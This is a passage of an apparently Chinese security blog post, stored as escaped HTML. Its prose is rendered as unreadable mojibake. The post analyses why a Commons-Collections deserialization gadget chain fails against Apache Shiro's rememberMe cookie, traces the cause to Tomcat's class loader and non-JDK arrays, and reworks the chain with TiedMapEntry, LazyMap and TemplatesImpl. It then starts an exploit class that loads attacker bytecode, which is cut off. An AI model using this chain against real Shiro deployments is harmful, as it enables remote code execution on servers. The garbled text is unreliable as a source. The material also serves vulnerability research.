&lt;p>çœ‹åˆ°è¿™ä¸ª&lt;code>org.apache.shiro.io.ClassResolvingObjectInputStream&lt;/code>ï¼Œå®ƒé‡å†™äº†&lt;code>resolveClass&lt;/code>æ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ClassResolvingObjectInputStream&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ClassResolvingObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">resolveClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectStreamClass&lt;/span> &lt;span style="color:#111">osc&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ClassUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">osc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnknownClassException&lt;/span> &lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Unable to load ObjectStreamClass [&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">osc&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;]: &amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯ååºåˆ—åŒ–ä¸­ç”¨æ¥æŸ¥æ‰¾ç±»çš„æ–¹æ³•ï¼Œå®ƒé‡å†™äº†&lt;code>ObjectInputStream&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">resolveClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectStreamClass&lt;/span> &lt;span style="color:#111">desc&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">desc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">latestUserDefinedLoader&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">primClasses&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">cl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„åˆ°å‰è€…ç”¨çš„æ˜¯&lt;code>org.apache.shiro.util.ClassUtils#forName&lt;/code>ï¼ˆå†…éƒ¨æ˜¯&lt;code>org.apache.catalina.loader.ParallelwebappClassLoader#loadClass&lt;/code>ï¼‰ï¼Œè€Œçˆ¶ç±»ç”¨çš„æ˜¯&lt;code>Class.forName&lt;/code>&lt;/p>
&lt;p>æˆ‘ä»¬åœ¨ä¸Šé¢çš„ä½ç½®æ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼›æ³¨æ„å¦‚æœæ–­ä¸ä¸‹æ¥ï¼Œå¯ä»¥è€ƒè™‘å¾€å‰æ‰¾ä¸€æ‰¾è°ƒç”¨å…³ç³»ï¼Œæ¯”å¦‚org.apache.shiro.mgt.AbstractRememberMeManager#decryptï¼Œå®ƒæ‰§è¡Œcookieéƒ¨åˆ†çš„è§£ç ï¼Œä¸­é—´è§¦å‘ååºåˆ—åŒ–&lt;/p>
&lt;p>&lt;code>resolveClass&lt;/code>ä¾æ¬¡å¾—åˆ°æˆ‘ä»¬é“¾å­ä¸­çš„LazyMapç­‰ç­‰ éƒ½å¾ˆæ­£å¸¸ï¼Œé—®é¢˜å‡ºåœ¨çªç„¶å‡ºç°çš„&lt;code>[Lorg.apache.commons.collections.Transformer;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302012117925.png" alt="image-20220302012117925">&lt;/p>
&lt;p>&lt;code>clazz==null&lt;/code>ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼Œä½†å¹¶ä¸æ˜¯å› å®ƒæ˜¯&lt;code>[L&lt;/code>æ ‡è®°çš„æ•°ç»„è¿™ä¸€ç‚¹å¯¼è‡´æŠ¥é”™ï¼Œå› ä¸ºåœ¨å®ƒåé¢è¿˜æœ‰&lt;code>fqcn=&amp;quot;[Ljava.lang.Object;&amp;quot;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302013221745.png" alt="image-20220302013221745">&lt;/p>
&lt;p>å®ƒå°±æ²¡æœ‰è¿”å›nullï¼Œåé¢è¿˜æœ‰å¥½å‡ ä¸ªéƒ½å¸¦&lt;code>[L&lt;/code>æ ‡è®°çš„å¯¹è±¡ï¼Œéƒ½æ²¡æœ‰è¿”å›nullï¼Œè¿™æ ·çš„çŒœæµ‹æ˜¾ç„¶æ˜¯é”™è¯¯çš„&lt;/p>
&lt;p>é‡æ–°å‘åŒ…å¹¶ç»§ç»­æ–­åœ¨&lt;code>loadClass&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302014123306.png" alt="image-20220302014123306">&lt;/p>
&lt;p>æˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œä½¿ç”¨çš„&lt;code>ClassLoader&lt;/code>æ˜¯ä¸Šé¢çš„&lt;code>ParallelWebappClassLoader&lt;/code>ï¼Œè€Œå®ƒçš„å·¥ä½œæ¨¡å¼å°±æ˜¯è¿™é‡Œçš„bugä¹‹å¤„&lt;/p>
&lt;p>&lt;img src="https://images2015.cnblogs.com/blog/722072/201706/722072-20170623200651991-1212784795.png" alt="img">&lt;/p>
&lt;p>javaè£…è½½ç±»æ—¶éµå¾ªâ€œå…¨ç›˜è´Ÿè´£å§”æ‰˜æœºåˆ¶â€ï¼Œâ€œå…¨ç›˜è´Ÿè´£â€æŒ‡çš„æ˜¯å½“ä¸€ä¸ªClassLoaderè£…è½½ä¸€ä¸ªç±»æ—¶ï¼Œé™¤éæ˜¾ç¤ºåœ°ä½¿ç”¨å¦å¤–ä¸€ä¸ªClassLoderï¼Œå¦åˆ™è¯¥ç±»æ‰€ä¾èµ–åŠå¼•ç”¨çš„ç±»ä¹Ÿç”±è¿™ä¸ªClassLoderè½½å…¥ï¼›â€œå§”æ‰˜æœºåˆ¶â€æŒ‡å…ˆå§”æ‰˜çˆ¶ç±»è£…è½½å™¨å¯»æ‰¾ç›®æ ‡ç±»ï¼Œåªæœ‰åœ¨æ‰¾ä¸åˆ°çš„æƒ…å†µä¸‹æ‰ä»è‡ªå·±çš„ç±»è·¯å¾„ä¸­æŸ¥æ‰¾å¹¶è£…è½½ç›®æ ‡ç±»ï¼Œå¯¹åº”åˆ°è¿™é‡Œï¼Œå½“å®ƒæ‰¾ä¸åˆ°æ—¶å°±ä¼šç”¨ä¸Šé¢çš„&lt;code>URLClassLoader&lt;/code>&lt;/p>
&lt;p>ï¼ˆç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œ&lt;code>WeappClassLoader&lt;/code>é»˜è®¤ä¸é€‚ç”¨å§”æ‰˜æœºåˆ¶&lt;/p>
&lt;p>æ­£å¸¸çš„classè§£æåpathæ˜¯æœ€å‰é¢åŠ &lt;code>/&lt;/code>ï¼Œ&lt;code>.&lt;/code>æ¢ä¸º&lt;code>/&lt;/code>ï¼Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302015732344.png" alt="image-20220302015732344">&lt;/p>
&lt;p>ä¹‹åè¿™ä¸ªå€¼ä¼šä¼ å…¥hashMapä½œä¸ºkeyï¼Œæˆ‘ä»¬ç›´æ¥åœ¨keyçš„åœ°æ–¹æ–­ï¼Œå‘ç°Transformeræ•°ç»„ä¼ å…¥ç¨æœ‰ç‚¹ç‰¹æ®Šï¼ˆæ•°ç»„éƒ½è¿™æ ·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020435664.png" alt="image-20220302020435664">&lt;/p>
&lt;p>é—®é¢˜æ˜¯å®ƒåœ¨å‰ä¸€æ­¥è°ƒç”¨çš„æ˜¯ä¸Šå±‚çš„&lt;code>URLClassLoader&lt;/code>ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020339145.png" alt="image-20220302020339145">&lt;/p>
&lt;p>å¯¹ç…§å…¶å®ƒå¸¦&lt;code>[L&lt;/code>çš„å¯¹è±¡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020711367.png" alt="image-20220302020711367">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020959932.png" alt="image-20220302020959932">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302021055809.png" alt="image-20220302021055809">&lt;/p>
&lt;p>è¢«æ­£å¸¸è§£æ&lt;/p>
&lt;p>ç»è¿‡ä¸Šé¢çš„è°ƒè¯•æˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼šå½“ååºåˆ—åŒ–æµä¸­å‡ºç°éjavaè‡ªèº«çš„æ•°ç»„ï¼Œä¼šå¼•èµ·&lt;code>ParallelWebappClassLoader&lt;/code>è§¦å‘åŒäº²å§”æ‰˜æœºåˆ¶ï¼Œå°†å¯¹è±¡äº¤ç»™ä¸Šå±‚çš„&lt;code>URLClassLoader&lt;/code>è¿›è¡Œå¤„ç†ï¼Œç”±äºå‚æ•°çš„ä¸åŒ¹é…ï¼Œè‡ªç„¶å°±å‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯&lt;/p>
&lt;h3 id="æä¸ªè¡Œçš„">æä¸ªè¡Œçš„&lt;/h3>
&lt;p>æ—¢ç„¶é—®é¢˜å‡ºåœ¨éjavaåŸç”Ÿçš„Transformeræ•°ç»„ä¸Šï¼Œæˆ‘ä»¬æŠŠå®ƒæ¢ä¸º&lt;code>TiedMapEntry&lt;/code>ï¼Œæ„é€ å‡½æ•°æ¥æ”¶ä¸¤ä¸ªå‚æ•° Mapå’ŒKeyï¼Œå®ƒæœ‰ä¸€ä¸ª&lt;code>getValue&lt;/code>æ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“æˆ‘ä»¬å‡ºä¼ å…¥çš„mapæ˜¯LazyMapæ—¶ï¼Œè¿™ä¸ªgetå°±å¯ä»¥è§¦å‘transformçš„å›è°ƒäº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsKey&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‰é¢ç”¨åˆ°&lt;code>get&lt;/code>æ—¶æˆ‘ä»¬å¹¶ä¸å…³å¿ƒä¼ å…¥çš„keyï¼Œå› ä¸ºé‡ç‚¹åœ¨Transformeræ•°ç»„çš„ConstantTransformerï¼Œæˆ‘ä»¬é€šè¿‡å®ƒæ¥åˆå§‹åŒ–æ¶æ„å¯¹è±¡&lt;/p>
&lt;p>è€Œä»”ç»†çœ‹è¿™é‡Œçš„keyä¼šè¢«ä¼ å…¥&lt;code>transform&lt;/code>ï¼Œå®ƒå¯ä»¥æ‰®æ¼”ConstantTransformerçš„è§’è‰²&lt;/p>
&lt;p>å†å›çœ‹Transformeræ•°ç»„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬äºŒè¡Œå¯ä»¥å»æ‰ï¼Œæ•°ç»„é•¿åº¦å˜ä¸º1ï¼Œæ•°ç»„ä¹Ÿä¸éœ€è¦äº†&lt;/p>
&lt;p>ç¼–å†™ä¸€ä¸‹exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6Shiro&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">clsBytes&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">clsBytes&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
